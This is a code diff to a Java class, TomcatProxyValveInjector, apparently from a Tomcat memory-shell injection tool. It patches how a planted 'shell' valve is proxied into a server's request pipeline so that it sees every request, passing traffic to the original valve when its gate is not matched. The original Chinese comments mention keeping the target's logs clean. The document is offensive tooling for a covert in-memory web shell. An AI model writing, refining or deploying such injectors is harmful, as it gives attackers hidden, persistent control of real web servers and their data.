@@ -5,6 +5,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
 import java.util.HashSet;
@@ -59,12 +60,14 @@ public class TomcatProxyValveInjector implements InvocationHandler {
     public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
         if ("invoke".equals(method.getName())) {
             try {
-                // 先让 shell 处理请求，再转发给原始 valve
-                method.invoke(proxyValve, args);
+                // Shell 自己负责：门禁未命中时进入 rawValve，命中时终止链路。
+                return method.invoke(proxyValve, args);
+            } catch (InvocationTargetException e) {
+                // 下游业务异常保持原始语义，避免重复执行 rawValve。
+                throw e.getCause();
             } catch (Throwable ignored) {
-                // Shell 处理失败仍继续原始 Valve 链，不污染目标日志。
+                return method.invoke(rawValve, args);
             }
-            return method.invoke(rawValve, args);
         }
         return method.invoke(rawValve, args);
     }
@@ -145,6 +148,7 @@ public class TomcatProxyValveInjector implements InvocationHandler {
             fieldName = "basic";
             rawValve = getFieldValue(pipeline, fieldName);
         }
+        invokeMethod(valve, "setNext", new Class[]{valveClass}, new Object[]{rawValve});
         Object proxyValve = Proxy.newProxyInstance(contextClassLoader, new Class[]{valveClass}, new TomcatProxyValveInjector(rawValve, valve));
         setFieldValue(pipeline, fieldName, proxyValve);
     }
